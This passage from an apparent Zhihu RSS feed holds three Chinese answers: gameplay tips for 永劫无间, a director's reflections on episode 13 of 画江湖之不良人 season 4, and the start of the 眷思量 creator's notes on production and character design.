src=\"https://pic1.zhimg.com/v2-3839349e7da0252dca20161520314048_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"同时建议先去自由练习那里熟悉一下游戏内的各种内容\" data-watermark=\"watermark\" data-original-src=\"v2-3839349e7da0252dca20161520314048\" data-watermark-src=\"v2-ca71ca9ffbd7f594ecce755602ad1f3e\" data-private-watermark-src=\"v2-772e7a2aa81224251c15ee09f062624b\"></p>\n<p>其实分清楚这几大类之后也没什么好讲的了，因为在游戏中主要捡拾装配的就是<b>【属性魂玉】</b>这一种，个人习惯就是近抗、远抗、然后剩下全加攻。</p>\n<p>另外就是别装配跟自己所持武器无关的魂玉，就好比你看到有个远程武器魂玉，但是你手里全是近战武器，又或者你看到的魂玉是给阔剑加成的，而你手里是两把太刀，那这种就没有必要了（除非你专门为了魂玉换武器）。</p>\n<p>而魂玉的获得途径主要也是四种：1.从魂玉点（和装备点不一样，魂玉点是绿色的一堆）获得；2.从装备点或地上捡获得；3.从地图内的商店（普通商店和飓风客）那里购买；4.从敌人的包里拿。</p>\n<p><b>3.游戏内商店——货郎</b></p>\n<p>当然了“买点”这个设定就不是很稀奇了，像《使命召唤：战区》里也有类似的设定，玩家在搜集金币之后可以去购买所需的装备。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-460f34873107fafaf25bf35d8f0e55d4_720w.jpg?rss\" data-rawwidth=\"1590\" data-rawheight=\"739\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-460f34873107fafaf25bf35d8f0e55d4\" data-watermark-src=\"v2-031f967d2098daca1fed72e63fe6ca22\" data-private-watermark-src=\"v2-4b52b021d8350108f1725a2c871e7a6a\"></p>\n<p>这里需要提一下的就是飓风客这种定时不定点刷新的买点，可以说去飓风客这里获取装备是一种“赌命行为”，因为这个买点太过扎眼，很容易被群起而攻之或者被埋伏偷袭，但是奖励太过丰厚（高等级装备且免费），确实值得一搏，毕竟搏一搏单车变摩托。</p>\n<p>拿完就跑真的刺激！</p>\n<p><b>4.走位、突击、脱战——飞索</b></p>\n<p>而这个游戏最有乐趣的一个设定大概就是飞索了，因为近战远程武器以及技能的这些多样设定，使得这个游戏其实很难做到像其他大逃杀游戏中“把人秒了”，而和人战斗普遍也都是近距离（近战）或者中近距离（近战/远程），如果身法足够，打不过就跑也是能够做到的。</p>\n<p>而飞索则是一个能够<b>迅速让玩家拉近距离加入战团、勾住敌人乘胜追击或者在状态不行时及时脱战的装备。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-31730def3ee9b1db15310e9f6c2061c2_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31730def3ee9b1db15310e9f6c2061c2\" data-watermark-src=\"v2-a5b76afba6110d66471db1d1dd9c9f0c\" data-private-watermark-src=\"v2-36980f9ea244a5b24621eb14fbe53c21\"></p>\n<p>飞索的原本按键是Q（发动）+左键（锁定），不过我个人根据个人习惯改成了鼠标下侧键+左键。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7fd631a56720e72c92ef066b8d04e95c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7fd631a56720e72c92ef066b8d04e95c\" data-watermark-src=\"v2-de5b9a3b8f434c641ab4ef8a8fc4d116\" data-private-watermark-src=\"v2-deae49417ae25f969bf7da8bc8f9377e\"></p>\n<p><b>PS：</b>不能自定义多键对应一动作是真的难受，这一点真的强烈希望网易进行一下改进。</p>\n<p>可以说飞索是在这个游戏中除了基本战斗操作外最重要的一点（一定要学好），灵活的身法有时候是可以弥补一定的战斗劣势的。</p>\n<p>而除了飞索之外，游戏中的加速走位方式同样也有滑铲（这个应该很多玩家都很熟悉，像《使命召唤：战区》、《APEX英雄》都有滑铲这一动作），不过个人感觉滑铲存在的问题和飞索类似，在《永劫无间》里将Ctrl键和C键分做了不同用处，有点破坏玩家习惯。</p>\n<p><b>PS：</b>Ctrl竟然是慢走！慢走！慢走！为什么我要在大逃杀游戏里慢走?我就算躲人我蹲着走不行么?</p>\n<p><b>5.装备容量</b></p>\n<p>上面也提到过这个游戏是很难秒人的，所以在大部分情况下，护甲的需求都是远高于血量的需求的，所以护甲药的需求量也要比血药高很多。</p>\n<p>个人习惯的话，在最终阶段就是大护甲药保持4-6个，大血药保持2个（因为一般都没命打），飞索保持12-18个，剩下的则是装备匣。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-57ca514653deac50115137a70d4fbfd9_720w.jpg?rss\" data-rawwidth=\"353\" data-rawheight=\"224\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57ca514653deac50115137a70d4fbfd9\" data-watermark-src=\"v2-c3ab50c016d3c344bc312c21886464f7\" data-private-watermark-src=\"v2-52fc03b30f4e63cf577f47c1591b1341\"></p>\n<p><b>6.换弹？修复武器——装备匣</b></p>\n<p>装备匣应该也算是这个游戏中比较特殊的一点，因为在游戏中无论是近战武器还是远程武器，进行战斗都会有所消耗（消耗到0时就用不了了），而装备匣就是用于修补消耗值的。</p>\n<p>而装备匣的对应按键就是寻常大逃杀和FPS游戏上弹时的R键，所以这个游戏大概多少可以治好你的换弹癌（滑稽）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bab06783b80b8e53bcee11924d559f9e_720w.jpg?rss\" data-rawwidth=\"562\" data-rawheight=\"365\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bab06783b80b8e53bcee11924d559f9e\" data-watermark-src=\"v2-8612c27e0cba77be9143f8ccc948fc92\" data-private-watermark-src=\"v2-4d25fdbabd0310dd353c559dc4794f5a\"></p>\n<p><b>PS：</b>游戏中有一个魂玉的名字叫毕工淌就是搭配修复装备的，不过很少见是真的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac10886b97cce00b9c1a5ee8c969ccf0_720w.jpg?rss\" data-rawwidth=\"727\" data-rawheight=\"303\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ac10886b97cce00b9c1a5ee8c969ccf0\" data-watermark-src=\"v2-93b6979c253d3e83fe164acb716a2e6b\" data-private-watermark-src=\"v2-060ade94292acaf128486dd8cc6e5d0e\"></p>\n<p><b>7.近战须知——振刀</b></p>\n<p>把振刀理解成弹反即可，这也是在近战与敌人缠斗的时候一种极为有效的反击手段（振刀可以把敌人的武器打掉），鼠标左右键同事按或者按鼠标上侧键即可触发。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d4fe6546f655af95584e050e3dee8c11_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d4fe6546f655af95584e050e3dee8c11\" data-watermark-src=\"v2-1c86d50ab149835c3185521df8e7485b\" data-private-watermark-src=\"v2-e3d8f06ec2e72e6f5ce7358106ad1abb\"></p>\n<p>严格来说这招我现在也没用熟练，不过这一招也确实算是除了飞索外最需要学会的一种手段（有奇效）。</p>\n<p><b>8.战术、意识</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-11498d4d1cb37a83041ffb3541ce8bec_720w.jpg?rss\" data-rawwidth=\"737\" data-rawheight=\"479\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-11498d4d1cb37a83041ffb3541ce8bec\" data-watermark-src=\"v2-b5bea30158b8594eb6395adde1d15c38\" data-private-watermark-src=\"v2-c555040d8464db496303e96592f10d45\"></p>\n<p>因为我的战斗水平并不是很强悍的那种，所以我在玩大逃杀游戏的时候也不喜欢莽上去直接加入别人混战的战团（因为这样很可能会成为别人混战的牺牲品）。</p>\n<p>而在《永劫无间》中，结合“飞索”、“很难秒人”这些特性，<b>“偷人”</b>本身也成了一种很常规的战术，等敌方两人消耗的差不多了自己使用飞索前去一顿输出收人头，然后事了拂衣去，深藏功与名。</p>\n<p><b>年轻人就该不讲武德（滑稽）。</b></p>\n<p>另外如果是多人组队的话，其实也可以注意一下阵容搭配（搭配一个奶）等。</p>\n<p><b>9.学习建议</b></p>\n<p>如果对游戏中的设定不太熟悉的话，其实建议在进行完开始的操作教学之后先去自由练习熟悉一下装备和魂玉，然后在去进阶教学体验上一小把，在这之后对游戏的理解就能深刻不少了。</p>\n<p>而在游戏中也有许多的小资源，例如消除脚步的蒲公英、回复护甲和血量的沙叻果，以及一些特殊的委派任务等等，这些格外的内容往往也会给游戏过程增加不少乐趣。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2af86c25564dfe7259854d54c5ed299d_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2af86c25564dfe7259854d54c5ed299d\" data-watermark-src=\"v2-43bb6b8bee1929537af205ac3b5e2c79\" data-private-watermark-src=\"v2-0d545f0ee10f7b51b4c26306bcdf4993\"></p>\n<p><br></p>\n<p>最后附上今中午刚刚打的一把：</p>\n<a href=\"https://www.zhihu.com/zvideo/1396505019567517696\">永劫无间：新手的快乐想象不到</a>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jin-xi-ri-52?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">锦曦日</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470627425/answer/1986211962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">20 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/459665057?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">原神新手十连，这样算欧吗？</a><br><a href=\"http://www.zhihu.com/question/308615720?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">硬核玩家和高玩有什么区别？</a><br>\n","link":"http://www.zhihu.com/question/470627425/answer/1986211962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《画江湖之不良人》第四季第十三集？","date":"2021-07-08 11:30:08","description":"\n<p>大家好，我是舒，播又来。今天最后一篇，至此12篇知乎的任务完成。</p>\n<p><br></p>\n<p>先闲聊两句吧！从2015年参与不良人2编剧至今已有六年，做导演这还是头一回。在紧紧巴巴的时间里磕磕碰碰，总算是完成了不良人4的所有内容，虽遗憾颇多，但只能到此为止。</p>\n<p>六年了，今天也该告别了。</p>\n<p><br></p>\n<p>五、六季的不良人中，我将不会再担任编剧与导演，只是负责与剧本监督一起敲定剧情走向与结局等“大方向”类的内容，剧本层面则由我们的编剧李皖青与李佳炫主笔，再加上导演李帅帅，往后是李家人的天下啦！</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a4037b691bc682d6db7f3490fd7bc25a_720w.jpeg?rss\" data-caption=\"上：李帅帅        左下：李皖青        右下：李佳炫\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"4030\" data-watermark=\"watermark\" data-original-src=\"v2-a4037b691bc682d6db7f3490fd7bc25a\" data-watermark-src=\"v2-f26bc87029df41a644e2460c33668895\" data-private-watermark-src=\"v2-6be3457b067d375f7c8c653a74af8fd2\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b7a926e0fbe0c88a117921a955afeaa6_720w.jpeg?rss\" data-caption=\"剧本监督     左：于奥       右：周铁男\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"5472\" data-watermark=\"watermark\" data-original-src=\"v2-b7a926e0fbe0c88a117921a955afeaa6\" data-watermark-src=\"v2-56391ed6bec2eedd6e4ebdd131d09bbc\" data-private-watermark-src=\"v2-281ea9d913d7ab9309975e850d1ea82c\"></p>\n<p>虽不再参与制作，但在闲暇时间我和李导偶尔也会交流一些后续内容，还参与了第五季OP画面的构思，我记得那天跟李导听着片头曲聊片头的时候还是很开心的！对了，在这里还要感谢一下不良人第四季的镜头导演由于13集片尾没有放入他们的照片，在这里补上！</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9dc441c6eb117fe42df592c9af4c8932_720w.jpeg?rss\" data-caption=\"左上：白玥萌        下：张翔       右上：任伟杰        上面的两位不愿意露脸\" data-size=\"normal\" data-rawwidth=\"3024\" data-rawheight=\"4030\" data-watermark=\"watermark\" data-original-src=\"v2-9dc441c6eb117fe42df592c9af4c8932\" data-watermark-src=\"v2-c01cdc7acfdb8e8fb99c20de4ab0b67d\" data-private-watermark-src=\"v2-3c074082baf3a5672f0ea33631f202f2\"></p>\n<p> 感谢作曲丁培峰老师和作词海雷老师的付出，创作出了歌曲《蛊》。之前听过他们合作的那首《不染》就很惊艳。在创作这首歌时是先词后曲的，海雷老师一共出了三版词，前两版的词也十分成熟，只是因为我个人喜好因而并未采纳，最终《蛊》的词出来一下子感觉就对了，十分简单明了的歌词，毫不矫情。最终这版词也没有做任何修改，作曲丁老师那边我更是完全没有操过任何心。毕竟有两位大神出马，我就在家乖乖等着发歌了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-be0dd0bbea8d7fbfa53ec8e0a44b01c9_720w.jpeg?rss\" data-caption=\"三个版本的歌词\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-be0dd0bbea8d7fbfa53ec8e0a44b01c9\" data-watermark-src=\"v2-4be08e917b3bf31f80d227e5aa0ed2d6\" data-private-watermark-src=\"v2-fb3b1d9425259e057463cb18e84cacd1\"></p>\n<p>还有一个遗憾还是想说一下，最后蚩梦母亲的镜头被不可抗力了，因而替换成了一只手，由于做的仓促效果并不理想，如果有剪辑帝的话，可以尝试把这个镜头放到正片里的位置试试看，效果会完全不同。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a89cb3356e7734c62baa0f0246239faa_720w.jpeg?rss\" data-caption=\"预告片中这个镜头我认为效果比较好，但正片中无法出现\" data-size=\"normal\" data-rawwidth=\"2337\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-a89cb3356e7734c62baa0f0246239faa\" data-watermark-src=\"v2-571d681a2c090d0485ad76bbd4bcf958\" data-private-watermark-src=\"v2-d56d67186bf32f88b640a434ba8ff157\"></p>\n<p>第四季最初叫做娆（苗）疆篇，因此会有许多观众认为此剧与不良人并无太大关系。大家不必担心，从第五季开始剧情将会回归主线内容。之前关于蚩梦与尤川的问题没有回复大家，只是因为不想做过多的引导，影响大家的观感。网上各种瞎传也只能当没看见，好家伙星雪凡轩蚩尤六个人死了个遍，连我妈都问我蚩梦是不是要死了……往后还是以看正剧为准吧，包括片头的内容也别轻易相信，蒙眼等细节只是跟“五感”有关而已。当然，经历了这么多，最让人灰心的还是在网络上出现了自己人的“图透”，不过都过去了，就不多提了。</p>\n<p>本季的创作初衷主要是想填一下曾经给娆疆那边挖过的坑，还要彻底解决蚩梦对李星云的爱恋之情。</p>\n<p>其实本季我们大可以避开这些“雷区”，不写、少写情感戏，或按照粉丝的想法组CP，将许多人物的曾经不了了之。但最后我们还是选择了做一件自己不后悔的事儿。包括今天的更新，用官方口径说“绝对安全”的话没意思，既然说了，就说点儿真正想说的，也能给关心不良人的观众一个答案。我们天津有个相声大师经常会说，观众就是衣食父母嘛，因此无论是黑是吹或是随便看看，只要大家是我们的观众，我们都是会重视的，谢谢你们的观看。</p>\n<p>作为主创，我认为在第二季中蚩梦与李星云所发生的一切，不能因为第三季出现了高热度的角色就当做不存在了，就像无论谁出现也不会影响李星云对姬如雪的情感一样，毕竟不良人系列是一个连续的故事。部分粉丝们过滤掉不利于自己的内容很正常，因为观众就应该是爱怎么看剧就怎么看剧，但我们不能这么做。</p>\n<p>蚩梦对于李星云的情感并不属于一见钟情，这与尤川对于蚩梦的情感设定比较相似——都是由于长时间接触而慢慢产生情感。自第二季“进房间两次”事件后，蚩梦虽以“小”自居但仍不甘愿，直到经历漠北与天山后才真对李星云正动情，且一往而深。关于天山圣女引出情蛊的结局早在第二季创作蚩梦的角色时就已想基本好，因此我们从没考虑过李星云有其他情感线的可能，但蚩梦的CP线确是在尤川出现后考虑过更换的，不过最后还是放弃了——因为没有合适的篇幅来解决她对李星云的情感。如果让蚩梦在心里有李星云的情况下喜欢其他人，这个角色将彻底崩掉，且不说李星云在场时他们的戏如何行进，新观众们很有可能对这个不纯粹的女孩再也喜欢不起来，到时候里外不是人的局面会更难收场。可如果用分量不够的方式解决她对李星云的情感，又会觉得第二季的剧情太儿戏。蚩梦对于李星云的付出有目共睹，她对李星云会是对“哥哥、亲人”的情感吗？或者她自己也不知道什么是喜欢吗？我只能说这种强行的话我说不出来。第二季的故事网上都能看，曾经“某运营人员”放出“哥哥、亲人、不知道啥是喜欢”这种话来引导观众，我认为是不负责任的做法，是不尊重观众与创作者的做法，也有可能是趁着尤川比较火出现的急功近利的做法。</p>\n<p>最终，我们决定在第四季终结这段许多人看来是“错误”的情感，给予蚩梦未来更多的可能性。“如果能不死，就不再喜欢了。”</p>\n<p>我一直觉得无论是做错了事，亦或是爱错了人，都该有相应的果报。也许现在这个时代许多人更愿意追求个好结果，但我还是会认为过程同样重要，没有好结果并不代表过程没有意义。我其实很不想把注定没有结果的情感说成是错误的情感，但也没办法，人在江湖，总是要跟着规矩活的。</p>\n<p>因此，蚩梦单纯而自由的人生观造成了她在情感上有这样的苦果，也是对她喜欢上李星云这件事的报，而我唏嘘这样的结局，是对我们写下了这段情感的报。</p>\n<p>有些情感是一张字条。是既见君子，云胡不喜。</p>\n<p>有些情感是一次争吵。是她有什么好，我哪里及不上她，你老是想着她，老是忘不了她。</p>\n<p>有些情感是一句告别。是身在波斯，日日祝公子福体康宁，诸事顺遂。</p>\n<p>可无论过程多苦，不管是尤川对蚩梦，蚩梦对老李，还是老李对姬如雪，我想只要是正向而单纯的情感，就应该是值得人去在意的。直到最后的最后，再了断过去，重新开始。</p>\n<p><br></p>\n<p>一个故事播出来，这个故事里的人物和剧情在某种意义上就不属于主创的了，而是属于观众的。我不清楚最终尤川留在十二峒修行，蚩梦统领万毒窟是不是个好结局，但他们之后各自都有更多的空间和可能了。不过以后的可能是什么，就得看以后的编剧啦！而且至少写作时不会再因一些“历史遗留”问题而束手束脚了，我也希望他们再出现时，都成长为可以独当一面的人物吧！<i>（毕竟尤川放走的蝴蝶只是盘旋，并没有飞走。靠这个我都说了，本来不想说的）</i></p>\n<p>关于侯卿在本季的节点，我们并没有交待，请大家继续往下看吧。</p>\n<p>下一季回到了老李和雪儿的主场，之后他们是如何携手前行的，就请大家拭目以待。<i>（我也想看，先在这里催个更……赶紧播…然后本集片尾放的是第五季的预告，不是什么大电影！！据我所知，动画大电影很有可能会有的！）</i></p>\n<p>回顾画江湖系列，之前若森数字的每一个导演都与团队拼劲全力，不断的试错、绕路、摸索着前进的方向。无论未来的路平摊还是颠簸，我都相信，若森有这样一群认真的人，一定会变得越来越强大。</p>\n<p><br></p>\n<p>若森加油，国漫加油！886！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469383435/answer/1985890753?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">278 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/467001152?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第11集？</a><br><a href=\"http://www.zhihu.com/question/465504311?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第 11 集？</a><br>\n","link":"http://www.zhihu.com/question/469383435/answer/1985890753?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价动画《眷思量》第五集？","date":"2021-07-07 04:00:11","description":"\n<p>大家好，这次非常感谢知乎的邀请，经过深度了解，发现知乎是一群有思想有态度的年轻人经常聚集交流的平台。感觉能让我这个很少上网冲浪的老人家跟年轻人又近了一步~但是初次上来非常非常紧张，为了备稿失眠了，首分享不知道该说啥好，就先跟大家先聊聊最近的心情和感受吧。   </p>\n<p><img src=\"https://pic1.zhimg.com/v2-4ff91f0924f67819391d215a726ece7f_720w.jpg?rss\" data-rawwidth=\"770\" data-rawheight=\"1365\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4ff91f0924f67819391d215a726ece7f\" data-watermark-src=\"v2-d4e48baecbf066026353ba24b5d68d24\" data-private-watermark-src=\"v2-19bfb76956873f55eb05b4f4563cb4d3\"></p>\n<p>这周一，《眷思量》第五集终于上线，且传来破亿喜讯，恍惚中还是十分开心，其实我从6月14号首播当天，到今天，这段时间仍旧深陷在最后几集高潮戏的紧张赶制中。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-262b3109f614d85df38a57bf69b61515_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-262b3109f614d85df38a57bf69b61515\" data-watermark-src=\"v2-8822564c81051ac66b445d01abb28501\" data-private-watermark-src=\"v2-7dff08c20aa9d3f703c1b40a90e4be0e\"></p>\n<p>和没上线前不一样的就是，每天还需要应对一大堆宣发物料的制作和审核，以及随时会来的合作洽谈和访谈准备等，所以前几周一直没什么时间上线跟观众朋友们多做交流，因为如果在公司见识过我工作状态和排队审核状态的人就知道，小伙伴们很多人加班到很晚，为了每天早点下班回家，排队等反馈的人的眼神能把其他插队的人生吞活剥=v=。</p>\n<p>我就比他们幸运多了～我不用走下班回家这个流程，我就住在公司阁楼，下楼就上班，上楼就躺倒。。。3年来生活就是工作，工作也是生活，无缝衔接。。。。。。嗯，是幸福的！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e1879b9f41c6eba70a9c68cac7d591bd_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e1879b9f41c6eba70a9c68cac7d591bd\" data-watermark-src=\"v2-efebadafe6c45a2961ea1e4e7ea5a15a\" data-private-watermark-src=\"v2-1b20342ba1ed8867da47981993729666\"></p>\n<p>之前幻想上线的时候应该会轻松些了吧，没想到真的到了这个阶段却是没上线前成倍的忙，以至于最近更晕头转向了，大概是我太吹毛求疵了，很多细节不磨到位就不肯罢休，也许草草收了尾，赶紧杀青，就不会像现在这样连轴转都转不过来了。但……那就不是我了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-43de09b692fb1330520b2eda7d2d649f_720w.jpg?rss\" data-rawwidth=\"1178\" data-rawheight=\"777\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-43de09b692fb1330520b2eda7d2d649f\" data-watermark-src=\"v2-45f2975a595d090b88f6afa81fef11cb\" data-private-watermark-src=\"v2-2c86b8e18109e5fe83383f2c9d4977d8\"></p>\n<p>前几周赶各环节反馈加上其他方面的工作量爆发，导致睡眠时间严重缩减到破纪录，最夸张的一天，睡了1个半小时爬起来，然后第二天，睡了3个半小时，两天，48小时，睡眠时间5小时，其他时间就像机器一样，白天跟各组人轮番交流推进度，晚上不断处理着各种反馈。第三天实在扛不住，才强制自己切断工作多睡几个小时。我相信自己能扛过去，一如每次遇到制作上的坎坷，都坚持着咬牙扛过来一样，因为我的背后还有很多各环节、各公司的小伙伴们支撑着我，他们都和我一样，想做一部好看的片子，跟有共同的目标的人们一起共事，让我无比欣慰也感觉充满力量。</p>\n<p>看到大家心疼我最近通宵很多，有留言说可以不那么辛苦，可以等等眷眷，会心一笑的同时，觉得确实，留得青山在不怕没柴烧，我是应该好好规划下工作强度和分工分担的问题了，但先把这一季扛完吧！</p>\n<p>《眷思量》是我从年少时起就一直做的一个梦。占据了我整个青春期的懵懂悸动和期许，我觉得自己属于很幸运的那种，眷眷不忘，果然必有回响，如今，我终于有机会让眷眷在你们面前徐徐展开，让你们看看我脑海中光怪陆离的东方幻想世界。以及一个个魂牵梦萦、美不胜收的美人们的具体样子。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-68099d8102d55c2463b60bd3b10135e6_720w.jpg?rss\" data-rawwidth=\"1914\" data-rawheight=\"1074\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-68099d8102d55c2463b60bd3b10135e6\" data-watermark-src=\"v2-61da933fd2e72145546129ac4280a07f\" data-private-watermark-src=\"v2-a747c00dab9d5106ff8404bf0d555f21\"></p>\n<p>初次有机会将自己儿时的梦实现，我无比珍惜这个机会，因为作为在行业摸爬滚打的从业人士，太明白这个机会代表了什么，也明白如果不把握好，这辈子可能没有第二次机会了。</p>\n<p>所以，在《眷思量》里，我加入了很多一直很想尝试的思路。</p>\n<p>比如关于人物的刻画展现。我希望大家看到这些角色的时候可以感受到他们所处的身份地位、状态人物性格等，而不是只能通过旁白或剧情的介绍，这样他们表演起来，大家更能感同身受他们的状态。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0bee574fc367af3081f8b92b62e54b48_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0bee574fc367af3081f8b92b62e54b48\" data-watermark-src=\"v2-d44daf740c6bc7238bdbc95f9bbc4a53\" data-private-watermark-src=\"v2-7c3a13bbd280d214700c8b7b73d8104d\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c47d965bfa910f9ffcab5aa1ef47ef19_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c47d965bfa910f9ffcab5aa1ef47ef19\" data-watermark-src=\"v2-b6b224d39021621322224e8f159e4dc2\" data-private-watermark-src=\"v2-360e65b8866edd28ee7b9ab4c57a870d\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-416e62be0de140797d32dbc68e14ecd3_720w.jpg?rss\" data-rawwidth=\"1850\" data-rawheight=\"1016\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-416e62be0de140797d32dbc68e14ecd3\" data-watermark-src=\"v2-ed3f990fa882bc4607db310fd1c2f758\" data-private-watermark-src=\"v2-ce7b9ad0d839ff22996aa2e4edeaba32\"></p>\n<p>以及角色和角色之间的关系可以通过他们的长相就看出来。</p>\n<p>比如小镜玄到大镜玄是真的成长起来的模样。我不标注大家也能看出是他小时候。片中的孩子都是用这种方式来建模的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b3caa00e2bd18042e714ff20ec1a90bc_720w.jpg?rss\" data-rawwidth=\"1919\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-b3caa00e2bd18042e714ff20ec1a90bc\" data-watermark-src=\"v2-8978fa402ad5d22dc7eb6d050db119fa\" data-private-watermark-src=\"v2-24db6cb167e1316590f0928e0b3af83d\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-713b2c6af3ffb1355e72e34440632372_720w.jpg?rss\" data-rawwidth=\"1926\" data-rawheight=\"1085\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-713b2c6af3ffb1355e72e34440632372\" data-watermark-src=\"v2-f8358988044d645cc0f8a296f18eb535\" data-private-watermark-src=\"v2-d60fb592382c05e9f131fb952cce9017\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c475dbb6b33b305d96a1727d9a17fee1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c475dbb6b33b305d96a1727d9a17fee1\" data-watermark-src=\"v2-5ffffa3437c78a21e3068f6981704677\" data-private-watermark-src=\"v2-95f7e5280a20eba9902c086c419bfa6b\"></p>\n<p>再比如程染、程熔和两个儿子是真的在遗传学上有继承的五官特征等等。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f2e4ee60c810a41bc731d8b4df1f8a82_720w.jpg?rss\" data-rawwidth=\"1937\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f2e4ee60c810a41bc731d8b4df1f8a82\" data-watermark-src=\"v2-28556adb4108df135d2192ef99f5a0d6\" data-private-watermark-src=\"v2-bba9cff5fb6024221ca6025f05e71125\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-caad8ebafdccf9622b310a835b465710_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1078\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-caad8ebafdccf9622b310a835b465710\" data-watermark-src=\"v2-7163c43e6b21fe527f465b8b44fc0a0e\" 